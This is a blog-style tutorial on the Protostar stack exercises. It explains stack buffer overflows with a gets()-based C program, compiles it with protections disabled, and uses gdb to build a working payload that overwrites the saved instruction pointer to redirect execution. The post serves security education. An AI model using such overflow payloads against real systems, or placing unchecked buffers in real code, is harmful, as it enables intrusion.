---
title: Binary Exploitation - Protostar - Stack
date: 2019-12-31 07:50:27
tags: Security
---

# Introduction

A month ago, I started attempting to complete the protostar exploitation exercises. These exercises go through the basics of binary exploitation allowing the student to practice the more fundamental skills on a vulnerable kernel of Linux.

The three main exploits that are taught are string format, stack overflow and heap overflow. The course starts off with the easier versions of these exploits and slowly progresses to challenges that require more precision and understanding.

For this series of blog posts, I'll outline the understanding that's required to create a solution for the final three levels that are a accumulation of the skills that were learned during the previous challenges. 

Much of the solutions were created by following the guide by LiveOverflow on Youtube, however it is probably worth writing up regardless for my own educational purposes.

# Stack Overflows
## Arbitrary Read/Write
The size of the stack frame for any function is determinable at compile-time. This means that it is possible for a stack frame to grow downwards towards the base of the previous stack frame and for current stack frame to *never* overwrite information within the previous one.

Side Note: this is also why dynamic memory cannot be allocated on the stack, the compiler **needs** to know exactly how many bytes to allocate for the stack frame at compile-time and this isn't possible if we dynamically allocate memory in the stack.

However, if certain functions are used in an unsafe way, this will allow data on the stack to be smashed. From the examples, this tends to be a function that writes to a buffer with limited size, however does not check the length of the data being written. If the data is larger than the buffer, the buffer will overflow (sometimes into the stack).

### Example

```cpp
int main(int argc, char **argv)
{
  char buffer[64];
  gets(buffer);
}
--
```

We can overflow the buffer easily by inputting more than the 64 characters that we've allocated for it.

```bash
python -c "print 'A' * 128" | ./a.out   
```
This will overwrite critical stack metadata and cause the program to SEGFAULT.

```bash
  5288 segmentation fault (core dumped)  ./a.out
```

## Code Redirection
There are a couple of ways to redirect code with a stack overflow. The most simple is overwriting the saved instruction pointer, this means that when the current function returns, we can get arbitrary code execution.

```cpp
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

We can compile this with flags that will disable some of the protections that modern systems have:
```bash
gcc so.c -fno-stack-protector -z execstack -no-pie
```
We can take a look at the effect of overflowing the stack in `gdb`.
```bash
gdb ./a.out
```
We can take a look at `main` by disassembling.
```bash
(gdb) disassemble main
```
```bash
Dump of assembler code for function main:
   0x000000000040054a <+0>:	    push   %rbp
   0x000000000040054b <+1>:	    mov    %rsp,%rbp
   0x000000000040054e <+4>:	    sub    $0x50,%rsp
   0x0000000000400552 <+8>:	    mov    %edi,-0x44(%rbp)
   0x0000000000400555 <+11>:	mov    %rsi,-0x50(%rbp)
   0x0000000000400559 <+15>:	lea    -0x40(%rbp),%rax
   0x000000000040055d <+19>:	mov    %rax,%rdi
   0x0000000000400560 <+22>:	mov    $0x0,%eax
   0x0000000000400565 <+27>:	callq  0x400440 <gets@plt>
   0x000000000040056a <+32>:	mov    $0x0,%eax
   0x000000000040056f <+37>:	leaveq 
=> 0x0000000000400570 <+38>:	retq   
End of assembler dump.
```

We an see our `gets()` call at `main+27`. Let's set a breakpoint before the function returns so we can see the state of the stack. 
```bash
(gdb) break *0x000000000040056f
```

Now let's run the program with an input that will overflow.
```bash
(gdb) run < <(python -c 'print "A" * 128')
```

We should hit the breakpoint that we set previously. Let's check what the stack looks like.
```bash
(gdb) x/50x $rsp-100
```
This commands tells `gdb` that we want to see 50 "words" (technically not words since I'm running a 64bit system) of data `x/50x`, starting at the address of the stack pointer minus one hundred, `$rsp-100`.
```bash
0x7fffffffd874:	0x00000000	0x0040056a	0x00000000	0xffffd9b8
0x7fffffffd884:	0x00007fff	0x00f0b5ff	0x00000001	0x41414141
0x7fffffffd894:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffd8a4:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffd8b4:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffd8c4:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffd8d4:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffd8e4:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffd8f4:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffd904:	0x41414141	0x41414141	0x41414141	0x00400400
0x7fffffffd914:	0x00000000	0xffffd9b0	0x00007fff	0x00000000
0x7fffffffd924:	0x00000000	0x00000000	0x00000000	0xa2729df4
0x7fffffffd934:	0x1c11f557	0xa52c9df4
```
We can see that our `A`'s have overwritten a significant portion of the stack. We can see what metadata regarding the stack frame we've overwritten by inspecting the stack frame.
`(gdb) info frame`

We get the following information.
```bash
Stack level 0, frame at 0x7fffffffd8d8:
 rip = 0x400570 in main; saved rip = 0x4141414141414141
 Arglist at 0x4141414141414141, args: 
 Locals at 0x4141414141414141, Previous frame's sp is 0x7fffffffd8e0
 Saved registers:
  rip at 0x7fffffffd8d8
```
We can see that we've overwritten a large portion of the stack frame metadata, but we've also written the saved `rip` which is the address of that the program will return to after the current function returns. If we overwrite this saved instruction pointer with something that we want, then we can change code flow.

From the output of `info frame` we can see that the saved instruction pointer is at `0x7fffffffd8d8`, which means that we'll need 72 characters to reach it, followed by the address of the place we want to go (which in this case is the `winner()` function).

We can find out the address of `winner()` using the `print` command.
```bash
(gdb) print win
```
We get the following output.
```bash
$2 = {<text variable, no debug info>} 0x400537 <win>
```

This means that the functions starts at `0x400537`.
This means the address bytes will be `\x00\x00\x00\x00\x00\0x40\x05\x37`, but I'm on a little endian system (and most likely so are you), so we'll need to flip the bytes, `\x37\x05\x40\x00\x00\x00\x00\x00`. 

Let's try this in `gdb`.
```bash
r < <(python -c "print 'A' * 72 + '\x37\x05\x40\x00\x00\x00\x00\x00'")
```

Using `c` to continue past the breakpoint we can see that we've successfully changed code execution.
```bash
(gdb) r < <(python -c "print 'A' * 72 + '\x37\x05\x40\x00\x00\x00\x00\x00'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/winstonzhao/Projects/sb/stackoverflow/a.out < <(python -c "print 'A' * 72 + '\x37\x05\x40\x00\x00\x00\x00\x00'")

Breakpoint 1, 0x0000000000400570 in main ()
(gdb) c
Continuing.
code flow successfully changed

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
```
